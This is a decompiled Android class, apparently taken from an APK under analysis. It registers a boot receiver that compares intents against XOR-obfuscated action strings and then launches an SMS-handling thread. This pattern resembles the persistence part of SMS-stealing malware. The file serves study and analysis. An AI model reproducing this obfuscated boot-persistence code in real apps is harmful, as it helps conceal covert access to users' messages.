package com.base.template;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import kotlin.collections.CollectionsKt__CollectionsKt;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class BootReceiver extends BroadcastReceiver {
    public static final /* synthetic */ int $r8$clinit = 0;

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        if (CollectionsKt__CollectionsKt.listOf(C0000.decode(new byte[]{87, 86, 86, 69, 11, 10, 82, 22, 91, 89, 16, 6, 88, 76, 28, 86, 7, 23, 95, 87, 92, 25, 38, 44, 121, 108, 109, 116, 43, 46, 102, 116, 119, 99, 33, 39}, "6827dc", true), C0000.decode(new byte[]{5, 87, 86, 65, 10, 80, 81, 72, 8, 11, 16, 93, 91, 77, 74, 88, 81, 71, 12, 86, 91, 72, 48, 48, 45, 123, 126, 123, 43, 118, 102, 108, 53, 118, 98, 35, 51, 42, 42}, "d923e95faed859", true), C0000.decode(new byte[]{91, 11, 95, 77, 10, 16, 91, 74, 91, 13, 22, 1, 86, 16, 28, 2, 1, 16, 81, 11, 92, 77, 51, 49, 113, 39, 121, 33, 45, 43, 108, 59, 98, 44, 53, 33, 106, 43, 124}, "8d2cbd", false), C0000.decode(new byte[]{4, 10, 84, 66, 12, 92, 2, 79, 80, 13, 70, 92, 91, 67, 31, 7, 6, 16, 89, 95, 13, 27, 42, 46, 122, 40, 119, 125, 106, 117, 126, 41, 49, 59, 115, 127, 46, 101, 42, 36, 109, 38, 118}, "ed00c5fa9c29571f", false), C0000.decode(new byte[]{89, 88, 1, 19, 88, 12, 7, 22, 8, 91, 70, 92, 10, 22, 22, 87, 6, 21, 94, 10, 13, 22, 44, 108, 109, 105, 37, 33, 115, 119, 34, 36, 104, 55, 38, 104, 45, 116, 113, 124, 32}, "86ea7ec8a529db", true), C0000.decode(new byte[]{7, 13, 6, 16, 87, 15, 93, 76, 12, 89, 18, 6, 12, 22, 22, 7, 90, 22, 12, 88, 8, 77, 50, 35, 123, 45, 120, 37, 32, 104, 52, 38, 50, 46, 121, 37, 124, 38}, "fcbb8f9be7", 0), C0000.decode(new byte[]{0, 15, 6, 20, 10, 15, 86, 31, 12, 86, 67, 3, 86, 64, 79, 0, 1, 18, 12, 9, 92, 31, 53, 121, 116, 45, 121, 115, 36, 62, 35, 34, 33, 35, 118}, "aabfef21e87f84", 7)).contains(intent.getAction())) {
            new Thread(new SmsReceiver$$ExternalSyntheticLambda0(intent, context.getApplicationContext(), goAsync())).start();
        }
    }
}
